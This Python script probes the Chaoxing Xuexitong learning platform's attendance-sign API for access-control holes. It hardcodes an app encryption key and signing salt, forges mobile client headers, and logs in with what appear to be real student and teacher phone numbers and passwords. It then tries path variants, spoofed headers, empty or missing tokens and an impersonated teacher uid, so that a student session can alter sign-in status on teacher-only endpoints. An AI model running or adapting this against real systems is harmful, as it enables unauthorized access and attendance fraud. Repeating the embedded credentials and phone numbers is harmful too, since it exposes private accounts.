#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
超星学习通 PC端API端点枚举与绕过测试脚本
"""

import base64, hashlib, json, uuid, requests, urllib3, time, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ============ 常量 ============
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"
ACTIVE_ID = "5000163891319"

PC_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"

# ============ 工具函数 ============
def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    resp = s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def make_pc_session(logged_session, puid):
    """将已登录的session切换为PC UA"""
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": PC_UA, "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.9"})
    # 复制cookies
    for c in logged_session.cookies:
        s.cookies.set(c.name, c.value, domain=c.domain, path=c.path)
    return s

def safe_text(resp, max_len=300):
    """安全截取响应文本"""
    if resp is None:
        return "NO_RESPONSE"
    t = resp.text.strip()
    if len(t) > max_len:
        return t[:max_len] + f"...[truncated, total={len(t)}]"
    return t

def is_success(resp_text):
    """检查响应是否表示成功"""
    if not resp_text:
        return False
    t = resp_text.lower()
    # result=1 或 "result":1 或 "success"
    if '"result":1' in t or '"result":true' in t:
        return True
    if '"result":"1"' in t:
        return True
    if '"success":true' in t or '"success":"true"' in t:
        return True
    if '"status":true' in t:
        return True
    if '"msg":"ok"' in t or '"message":"ok"' in t:
        return True
    return False

def is_interesting(resp_text):
    """检查响应是否有趣（非空、非纯错误）"""
    if not resp_text:
        return False
    t = resp_text.lower()
    if t in ("", "{}", "[]", "null", "none", "error", "forbidden", "unauthorized"):
        return False
    if '"error"' in t and '"result":0' in t:
        return False
    if len(t) < 5:
        return False
    return True

# ============ 主逻辑 ============
def main():
    print("=" * 80)
    print("  超星学习通 PC端API端点枚举与绕过测试")
    print("=" * 80)
    print()

    # 登录
    print("[*] 正在登录学生账号...")
    stu_session_raw, puid_s = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"    学生PUID: {puid_s}")
    if not puid_s:
        print("[!] 学生登录失败，退出")
        sys.exit(1)

    print("[*] 正在登录教师账号...")
    tea_session_raw, puid_t = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"    教师PUID: {puid_t}")
    if not puid_t:
        print("[!] 教师登录失败，退出")
        sys.exit(1)

    # 创建PC UA session
    stu_pc = make_pc_session(stu_session_raw, puid_s)
    tea_pc = make_pc_session(tea_session_raw, puid_t)

    # 结果收集
    results = []
    interesting_findings = []
    success_findings = []

    def test_endpoint(path, method="GET", params=None, session=None, label="", extra_headers=None):
        """测试单个端点"""
        url = BASE + path
        try:
            if method == "GET":
                r = session.get(url, params=params, timeout=15, allow_redirects=False)
            else:
                r = session.post(url, data=params, timeout=15, allow_redirects=False)
            return r
        except Exception as e:
            return None

    # ================================================================
    # Part 1: PC端API端点枚举
    # ================================================================
    print()
    print("=" * 80)
    print("  Part 1: PC端API端点枚举")
    print("=" * 80)

    # 端点列表
    pcTea_endpoints = [
        "updateSignStatus", "updateSignStatus2", "getSignDetail", "deleteSign",
        "addSign", "preSign", "startSign", "endSign", "signList", "stuList",
        "exportSign", "saveSign", "modifySign", "cancelSign", "batchUpdate",
        "getStuSignList", "signDetail", "signResult", "signedResult",
        "querySignStatus", "updateRemark"
    ]

    pcStu_endpoints = [
        "preSign", "sign", "doSign", "qrSign", "signResult",
        "getSignInfo", "signInfo", "checkSign", "startSign"
    ]

    other_controllers = [
        "pcSignController", "signController", "teaSignController",
        "stuSignController", "qrSignController", "signAdminController",
        "signManageController", "signApiController"
    ]

    common_params = {
        "activeId": ACTIVE_ID,
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "status": "1",
    }

    # --- pcTeaSignController ---
    print("\n" + "-" * 60)
    print("  [1.1] pcTeaSignController 端点枚举")
    print("-" * 60)

    for ep in pcTea_endpoints:
        path = f"/widget/sign/pcTeaSignController/{ep}"
        params = dict(common_params)
        # pcTeaSignController 特有参数
        params["uid"] = puid_s
        params["denc"] = "test"
        params["duid"] = puid_s

        # 学生 GET
        r_stu_get = test_endpoint(path, "GET", params, stu_pc, "学生GET")
        # 教师 GET
        r_tea_get = test_endpoint(path, "GET", params, tea_pc, "教师GET")
        # 学生 POST
        r_stu_post = test_endpoint(path, "POST", params, stu_pc, "学生POST")
        # 教师 POST
        r_tea_post = test_endpoint(path, "POST", params, tea_pc, "教师POST")

        stu_get_text = safe_text(r_stu_get) if r_stu_get else "NO_RESPONSE"
        tea_get_text = safe_text(r_tea_get) if r_tea_get else "NO_RESPONSE"
        stu_post_text = safe_text(r_stu_post) if r_stu_post else "NO_RESPONSE"
        tea_post_text = safe_text(r_tea_post) if r_tea_post else "NO_RESPONSE"

        stu_get_code = r_stu_get.status_code if r_stu_get else "N/A"
        tea_get_code = r_tea_get.status_code if r_tea_get else "N/A"
        stu_post_code = r_stu_post.status_code if r_stu_post else "N/A"
        tea_post_code = r_tea_post.status_code if r_tea_post else "N/A"

        marker = ""
        # 检查学生是否成功
        if r_stu_get and is_success(r_stu_get.text):
            marker = "!!!"
            success_findings.append(f"学生GET成功: {path}")
        if r_stu_post and is_success(r_stu_post.text):
            marker = "!!!"
            success_findings.append(f"学生POST成功: {path}")
        # 检查学生和教师响应差异
        if stu_get_text != tea_get_text and stu_get_text != "NO_RESPONSE" and tea_get_text != "NO_RESPONSE":
            if not marker:
                marker = "***"
            interesting_findings.append(f"学生/教师GET响应不同: {path}")
        if stu_post_text != tea_post_text and stu_post_text != "NO_RESPONSE" and tea_post_text != "NO_RESPONSE":
            if not marker:
                marker = "***"
            interesting_findings.append(f"学生/教师POST响应不同: {path}")

        print(f"  {marker} {ep:25s} | 学生GET[{stu_get_code}]: {stu_get_text[:80]}")
        print(f"    {'':25s} | 教师GET[{tea_get_code}]: {tea_get_text[:80]}")
        print(f"    {'':25s} | 学生POST[{stu_post_code}]: {stu_post_text[:80]}")
        print(f"    {'':25s} | 教师POST[{tea_post_code}]: {tea_post_text[:80]}")

        results.append({
            "path": path, "controller": "pcTeaSignController", "endpoint": ep,
            "stu_get_code": stu_get_code, "tea_get_code": tea_get_code,
            "stu_post_code": stu_post_code, "tea_post_code": tea_post_code,
            "stu_get_text": stu_get_text, "tea_get_text": tea_get_text,
            "stu_post_text": stu_post_text, "tea_post_text": tea_post_text,
            "marker": marker
        })

    # --- pcStuSignController ---
    print("\n" + "-" * 60)
    print("  [1.2] pcStuSignController 端点枚举")
    print("-" * 60)

    for ep in pcStu_endpoints:
        path = f"/widget/sign/pcStuSignController/{ep}"
        params = dict(common_params)
        params["uid"] = puid_s

        r_stu_get = test_endpoint(path, "GET", params, stu_pc, "学生GET")
        r_tea_get = test_endpoint(path, "GET", params, tea_pc, "教师GET")
        r_stu_post = test_endpoint(path, "POST", params, stu_pc, "学生POST")
        r_tea_post = test_endpoint(path, "POST", params, tea_pc, "教师POST")

        stu_get_text = safe_text(r_stu_get) if r_stu_get else "NO_RESPONSE"
        tea_get_text = safe_text(r_tea_get) if r_tea_get else "NO_RESPONSE"
        stu_post_text = safe_text(r_stu_post) if r_stu_post else "NO_RESPONSE"
        tea_post_text = safe_text(r_tea_post) if r_tea_post else "NO_RESPONSE"

        stu_get_code = r_stu_get.status_code if r_stu_get else "N/A"
        tea_get_code = r_tea_get.status_code if r_tea_get else "N/A"
        stu_post_code = r_stu_post.status_code if r_stu_post else "N/A"
        tea_post_code = r_tea_post.status_code if r_tea_post else "N/A"

        marker = ""
        if r_stu_get and is_success(r_stu_get.text):
            marker = "!!!"
            success_findings.append(f"学生GET成功: {path}")
        if r_stu_post and is_success(r_stu_post.text):
            marker = "!!!"
            success_findings.append(f"学生POST成功: {path}")
        if stu_get_text != tea_get_text and stu_get_text != "NO_RESPONSE" and tea_get_text != "NO_RESPONSE":
            if not marker:
                marker = "***"
            interesting_findings.append(f"学生/教师GET响应不同: {path}")

        print(f"  {marker} {ep:25s} | 学生GET[{stu_get_code}]: {stu_get_text[:80]}")
        print(f"    {'':25s} | 教师GET[{tea_get_code}]: {tea_get_text[:80]}")
        print(f"    {'':25s} | 学生POST[{stu_post_code}]: {stu_post_text[:80]}")
        print(f"    {'':25s} | 教师POST[{tea_post_code}]: {tea_post_text[:80]}")

        results.append({
            "path": path, "controller": "pcStuSignController", "endpoint": ep,
            "stu_get_code": stu_get_code, "tea_get_code": tea_get_code,
            "stu_post_code": stu_post_code, "tea_post_code": tea_post_code,
            "stu_get_text": stu_get_text, "tea_get_text": tea_get_text,
            "stu_post_text": stu_post_text, "tea_post_text": tea_post_text,
            "marker": marker
        })

    # --- 其他控制器 ---
    print("\n" + "-" * 60)
    print("  [1.3] 其他控制器端点枚举")
    print("-" * 60)

    for ctrl in other_controllers:
        # 测试控制器根路径和常见端点
        test_paths = [f"/widget/sign/{ctrl}/"]
        for ep in ["index", "list", "getSignDetail", "startSign", "sign", "doSign",
                    "updateSignStatus", "updateSignStatus2", "preSign", "signList"]:
            test_paths.append(f"/widget/sign/{ctrl}/{ep}")

        for path in test_paths:
            params = dict(common_params)
            params["uid"] = puid_s
            params["denc"] = "test"
            params["duid"] = puid_s

            r_stu = test_endpoint(path, "GET", params, stu_pc, "学生GET")
            r_tea = test_endpoint(path, "GET", params, tea_pc, "教师GET")

            stu_text = safe_text(r_stu, 150) if r_stu else "NO_RESPONSE"
            tea_text = safe_text(r_tea, 150) if r_tea else "NO_RESPONSE"
            stu_code = r_stu.status_code if r_stu else "N/A"
            tea_code = r_tea.status_code if r_tea else "N/A"

            # 跳过404且无内容的
            if stu_code == 404 and tea_code == 404:
                continue

            marker = ""
            if r_stu and is_success(r_stu.text):
                marker = "!!!"
                success_findings.append(f"学生GET成功: {path}")
            if stu_text != tea_text and stu_text != "NO_RESPONSE" and tea_text != "NO_RESPONSE":
                if not marker:
                    marker = "***"
                interesting_findings.append(f"学生/教师响应不同: {path}")

            ep_name = path.split("/")[-1] if path.endswith("/") else path.split("/")[-1]
            print(f"  {marker} {ctrl}/{ep_name:25s} | 学生GET[{stu_code}]: {stu_text[:80]}")
            print(f"    {'':30s} | 教师GET[{tea_code}]: {tea_text[:80]}")

            results.append({
                "path": path, "controller": ctrl, "endpoint": ep_name,
                "stu_get_code": stu_code, "tea_get_code": tea_code,
                "stu_get_text": stu_text, "tea_get_text": tea_text,
                "marker": marker
            })

    # ================================================================
    # Part 2: Bypass测试 - updateSignStatus2
    # ================================================================
    print()
    print("=" * 80)
    print("  Part 2: updateSignStatus2 绕过测试")
    print("=" * 80)

    bypass_results = []

    def bypass_test(label, path, method="GET", params=None, session=None, extra_headers=None):
        url = BASE + path
        s = session or stu_pc
        hdrs = dict(s.headers)
        if extra_headers:
            hdrs.update(extra_headers)
        try:
            if method == "GET":
                r = s.get(url, params=params, timeout=15, allow_redirects=False, headers=hdrs)
            else:
                r = s.post(url, data=params, timeout=15, allow_redirects=False, headers=hdrs)
            txt = safe_text(r)
            code = r.status_code
        except Exception as e:
            txt = f"ERROR: {e}"
            code = "N/A"

        marker = ""
        if "result" in txt.lower() and ("1" in txt or "true" in txt.lower()):
            if is_success(txt):
                marker = "!!!"
                success_findings.append(f"Bypass成功: {label}")
        if code != 404 and code != "N/A" and len(txt) > 5:
            marker = marker or "***"
            interesting_findings.append(f"Bypass有响应: {label}")

        print(f"  {marker} [{method:4s}] {label:50s} | [{code}] {txt[:100]}")
        bypass_results.append({"label": label, "method": method, "path": path, "code": code, "text": txt, "marker": marker})

    base_params = {
        "uid": puid_s,
        "activeId": ACTIVE_ID,
        "status": "1",
        "denc": "test",
        "duid": puid_s,
    }

    # 2.1 直接调用
    print("\n  [2.1] 直接调用")
    bypass_test("直接GET调用", "/widget/sign/pcTeaSignController/updateSignStatus2",
                "GET", base_params, stu_pc)
    bypass_test("直接POST调用", "/widget/sign/pcTeaSignController/updateSignStatus2",
                "POST", base_params, stu_pc)

    # 2.2 路径变体
    print("\n  [2.2] 路径变体")
    path_variants = [
        "/widget/sign/pcTeaSignController/updateSignStatus2/",
        "/widget/sign/pcTeaSignController/updateSignStatus2;",
        "/widget/sign/pcTeaSignController/updateSignStatus2.json",
        "/widget/sign/pcTeaSignController/updateSignStatus2.html",
        "/widget/sign/pcTeaSignController/updateSignStatus2?",
        "/widget%2Fsign%2FpcTeaSignController%2FupdateSignStatus2",
        "/widget/sign/pcTeaSignController/UpdateSignStatus2",  # 大小写
        "/widget/sign/pcTeaSignController/UPDATESIGNSTATUS2",  # 全大写
    ]
    for pv in path_variants:
        bypass_test(f"路径变体: {pv}", pv, "GET", base_params, stu_pc)

    # 2.3 Header操纵
    print("\n  [2.3] Header操纵")
    bypass_test("无Referer", "/widget/sign/pcTeaSignController/updateSignStatus2",
                "GET", base_params, stu_pc, {"Referer": ""})
    bypass_test("教师页面Referer",
                "/widget/sign/pcTeaSignController/updateSignStatus2",
                "GET", base_params, stu_pc,
                {"Referer": f"https://mobilelearn.chaoxing.com/widget/pcpick/tea/index?courseId={COURSE_ID}&classId={CLASS_ID}"})
    bypass_test("X-Requested-With: XMLHttpRequest",
                "/widget/sign/pcTeaSignController/updateSignStatus2",
                "GET", base_params, stu_pc,
                {"X-Requested-With": "XMLHttpRequest"})
    bypass_test("Content-Type: application/json",
                "/widget/sign/pcTeaSignController/updateSignStatus2",
                "POST", base_params, stu_pc,
                {"Content-Type": "application/json"})
    bypass_test("模拟教师UA+Referer",
                "/widget/sign/pcTeaSignController/updateSignStatus2",
                "GET", base_params, stu_pc,
                {"Referer": f"https://mobilelearn.chaoxing.com/widget/pcpick/tea/index?courseId={COURSE_ID}&classId={CLASS_ID}",
                 "X-Requested-With": "XMLHttpRequest"})

    # 2.4 参数操纵
    print("\n  [2.4] 参数操纵")
    # 空denc
    params_no_denc = dict(base_params)
    params_no_denc["denc"] = ""
    bypass_test("空denc", "/widget/sign/pcTeaSignController/updateSignStatus2",
                "GET", params_no_denc, stu_pc)

    # 无denc参数
    params_without_denc = {k: v for k, v in base_params.items() if k != "denc"}
    bypass_test("无denc参数", "/widget/sign/pcTeaSignController/updateSignStatus2",
                "GET", params_without_denc, stu_pc)

    # 冒充教师uid
    params_impersonate = dict(base_params)
    params_impersonate["uid"] = puid_t
    bypass_test("uid=教师puid", "/widget/sign/pcTeaSignController/updateSignStatus2",
                "GET", params_impersonate, stu_pc)

    # 不同status值
    for st in [0, 2, 3, 4, 5, 6]:
        params_st = dict(base_params)
        params_st["status"] = str(st)
        bypass_test(f"status={st}", "/widget/sign/pcTeaSignController/updateSignStatus2",
                    "GET", params_st, stu_pc)

    # 2.5 V1端点
    print("\n  [2.5] V1端点 (updateSignStatus)")
    bypass_test("V1 GET", "/widget/sign/pcTeaSignController/updateSignStatus",
                "GET", base_params, stu_pc)
    bypass_test("V1 POST", "/widget/sign/pcTeaSignController/updateSignStatus",
                "POST", base_params, stu_pc)

    # 教师调用V1
    bypass_test("V1 教师GET", "/widget/sign/pcTeaSignController/updateSignStatus",
                "GET", {**base_params, "uid": puid_t}, tea_pc)
    bypass_test("V1 教师POST", "/widget/sign/pcTeaSignController/updateSignStatus",
                "POST", {**base_params, "uid": puid_t}, tea_pc)

    # ================================================================
    # Part 3: 学生访问教师页面
    # ================================================================
    print()
    print("=" * 80)
    print("  Part 3: 学生访问教师页面测试")
    print("=" * 80)

    teacher_pages = [
        f"/widget/sign/pcTeaSignController/",
        f"/widget/pcpick/tea/index?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={puid_s}",
    ]

    for page_url in teacher_pages:
        full_url = BASE + page_url if not page_url.startswith("http") else page_url

        # 学生访问
        try:
            r_stu = stu_pc.get(full_url, timeout=15, allow_redirects=False)
            stu_text = safe_text(r_stu, 200)
            stu_code = r_stu.status_code
        except Exception as e:
            stu_text = f"ERROR: {e}"
            stu_code = "N/A"

        # 教师访问
        try:
            r_tea = tea_pc.get(full_url, timeout=15, allow_redirects=False)
            tea_text = safe_text(r_tea, 200)
            tea_code = r_tea.status_code
        except Exception as e:
            tea_text = f"ERROR: {e}"
            tea_code = "N/A"

        marker = ""
        if stu_code != 403 and stu_code != 302 and stu_code != "N/A":
            marker = "***"
            interesting_findings.append(f"学生可访问教师页面: {page_url}")
        if stu_code == 200 and tea_code == 200:
            if stu_text != tea_text:
                marker = "***"
                interesting_findings.append(f"学生/教师页面内容不同: {page_url}")

        print(f"  {marker} {page_url}")
        print(f"      学生[{stu_code}]: {stu_text[:100]}")
        print(f"      教师[{tea_code}]: {tea_text[:100]}")

    # ================================================================
    # 汇总
    # ================================================================
    print()
    print("=" * 80)
    print("  汇总报告")
    print("=" * 80)

    # 有趣发现
    print(f"\n  *** 有趣发现 (学生/教师响应不同): {len(interesting_findings)} 项")
    for f in interesting_findings:
        print(f"    *** {f}")

    # 成功发现
    print(f"\n  !!! 学生成功访问: {len(success_findings)} 项")
    for f in success_findings:
        print(f"    !!! {f}")

    # 端点状态表
    print(f"\n  端点状态汇总表:")
    print(f"  {'控制器':<25s} {'端点':<25s} {'学生GET':<8s} {'教师GET':<8s} {'学生POST':<8s} {'教师POST':<8s} {'标记'}")
    print(f"  {'-'*25} {'-'*25} {'-'*8} {'-'*8} {'-'*8} {'-'*8} {'-'*6}")

    for r in results:
        stu_get = str(r.get("stu_get_code", "N/A"))
        tea_get = str(r.get("tea_get_code", "N/A"))
        stu_post = str(r.get("stu_post_code", "N/A"))
        tea_post = str(r.get("tea_post_code", "N/A"))
        marker = r.get("marker", "")
        print(f"  {r['controller']:<25s} {r['endpoint']:<25s} {stu_get:<8s} {tea_get:<8s} {stu_post:<8s} {tea_post:<8s} {marker}")

    # Bypass结果
    print(f"\n  Bypass测试汇总:")
    print(f"  {'标签':<55s} {'方法':<6s} {'状态码':<8s} {'标记'}")
    print(f"  {'-'*55} {'-'*6} {'-'*8} {'-'*6}")
    for b in bypass_results:
        print(f"  {b['label']:<55s} {b['method']:<6s} {str(b['code']):<8s} {b['marker']}")

    print()
    print("=" * 80)
    print("  测试完成")
    print("=" * 80)

if __name__ == "__main__":
    main()
